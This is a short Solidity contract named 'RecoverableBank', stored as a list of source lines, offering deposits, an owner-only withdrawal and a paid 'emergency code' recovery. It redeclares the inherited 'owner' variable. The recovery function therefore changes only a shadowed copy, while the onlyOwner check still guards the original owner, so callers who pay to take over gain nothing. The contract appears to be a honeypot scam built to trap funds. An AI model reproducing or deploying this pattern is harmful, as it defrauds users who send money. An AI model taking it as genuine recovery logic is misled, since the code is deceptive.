['pragma solidity ^0.4.18;\n', '\n', 'contract Owned {\n', '    address public owner;\n', '    function Owned() { owner = msg.sender; }\n', '    modifier onlyOwner{ if (msg.sender != owner) revert(); _; }\n', '}\n', '\n', 'contract RecoverableBank is Owned {\n', '    event BankDeposit(address from, uint amount);\n', '    event BankWithdrawal(address from, uint amount);\n', '    address public owner = msg.sender;\n', '    uint256 ecode;\n', '    uint256 evalue;\n', '\n', '    function() public payable {\n', '        deposit();\n', '    }\n', '\n', '    function deposit() public payable {\n', '        require(msg.value > 0);\n', '        BankDeposit(msg.sender, msg.value);\n', '    }\n', '\n', '    function setEmergencyCode(uint256 code, uint256 value) public onlyOwner {\n', '        ecode = code;\n', '        evalue = value;\n', '    }\n', '\n', '    function useEmergencyCode(uint256 code) public payable {\n', '        if ((code == ecode) && (msg.value == evalue)) owner = msg.sender;\n', '    }\n', '\n', '    function withdraw(uint amount) public onlyOwner {\n', '        require(amount <= this.balance);\n', '        msg.sender.transfer(amount);\n', '    }\n', '}']